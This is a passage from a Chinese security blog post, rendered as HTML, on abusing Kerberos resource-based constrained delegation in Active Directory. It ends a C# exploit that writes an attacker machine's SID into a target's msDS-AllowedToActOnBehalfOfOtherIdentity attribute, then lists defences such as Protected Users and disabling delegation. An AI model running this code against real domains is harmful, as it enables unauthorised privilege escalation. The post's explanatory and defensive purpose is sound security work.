+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">DirectoryEntry</span> <span class="n">entryToUpdate</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">GetDirectoryEntry</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">sec_descriptor</span> <span class="o">=</span> <span class="s">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&#34;</span> <span class="o">+</span> <span class="n">sid</span><span class="p">.</span><span class="n">Value</span> <span class="o">+</span> <span class="s">&#34;)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">sd</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RawSecurityDescriptor</span><span class="p">(</span><span class="n">sec_descriptor</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">byte</span><span class="p">[]</span> <span class="n">descriptor_buffer</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="n">sd</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">sd</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="n">descriptor_buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="n">entryToUpdate</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="s">&#34;msds-allowedtoactonbehalfofotheridentity&#34;</span><span class="p">].</span><span class="n">Value</span> <span class="o">=</span> <span class="n">descriptor_buffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">try</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="n">entryToUpdate</span><span class="p">.</span><span class="n">CommitChanges</span><span class="p">();</span><span class="c1">//提交更改
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">          <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[+] Exploit successfully!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">catch</span> <span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;[!] </span><span class="se">\n</span><span class="s">Failed...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><hr>
+<h2 id="防御"><strong>防御：</strong></h2>
+<p>1.高权限账号设置禁止委派属性</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/54.png" alt="image"></p>
+<p>2.微软推出了<strong>protected users组，组内用户不允许被委派</strong>，适用于Windows Server 2016，Windows Server 2012 R2、 Windows Server 2012</p>
+<p>Protected Users 组中的帐户只能使用 Kerberos 协议进行身份验证，拒绝 NTLM、Digest 和 CredSSP。</p>
+<p>Kerberos拒绝使用 DES 和 RC4 加密类型进行预身份验证 ，域必须配置为支持 AES 或更高版本。</p>
+<p>受保护用户的帐户不能通过 Kerberos 约束或无约束委派进行委派。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/55.png" alt="image"></p>
+<p>3.kerberos预认证不使用DES或RC4等加密算法（<strong>尽量使用AES256</strong>）同样能够预防<code>Kerberoast</code>攻击</p>
+<h2 id="参考"><strong>参考</strong></h2>
+<p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
+<p><a href="https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/</a></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://lzzbb.github.io/tags/ad/">AD</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        979 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-04-23 08:00 &#43;0800
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://lzzbb.github.io/posts/2021/06/wdigest/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">wdigest</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://lzzbb.github.io/posts/2021/04/kerberos%E5%88%A9%E7%94%A8%E9%9D%A2/">
+                    <span class="button__text">kerberos利用面</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://lzzbb.github.io/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js" integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l&#43;qxcnN3UWK6NyURtxH&#43;ovdgjyFuaKZ7si1g=="></script>
+
+
+
+    </body>
+</html>
